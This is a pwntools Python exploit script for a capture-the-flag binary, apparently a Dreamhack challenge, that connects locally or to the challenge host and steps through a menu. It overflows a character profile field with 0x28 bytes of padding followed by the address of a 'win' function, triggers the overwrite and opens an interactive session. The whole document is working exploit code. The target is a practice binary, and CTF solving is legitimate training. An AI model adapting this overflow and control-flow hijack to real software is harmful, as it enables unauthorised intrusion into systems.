#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.39.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("host8.dreamhack.games", 14136)

    return r


def main():
    r = conn()

    r.sendlineafter(b">> ", b"1")
    r.sendlineafter(b": ", b"1")

    r.sendlineafter(b">> ", b"2")
    r.sendlineafter(b": ", b"1")

    r.sendafter(b"Character name: ", b"A" * 0x10)
    payload = b"A" * 0x28
    payload += p64(exe.symbols["win"])
    r.sendlineafter(b"Character profile: ", payload)

    r.sendlineafter(b">> ", b"3")
    r.sendlineafter(b": ", b"1")

    r.sendlineafter(b">> ", b"4")

    r.sendlineafter(b">> ", b"1")
    r.sendlineafter(b": ", b"1")

    r.sendlineafter(b">> ", b"2")
    r.sendlineafter(b": ", b"1")

    r.sendlineafter(b"Character name: ", b"A" * 0x48)

    r.sendlineafter(b">> ", b"5")
    r.sendlineafter(b": ", b"1")

    r.interactive()


if __name__ == "__main__":
    main()
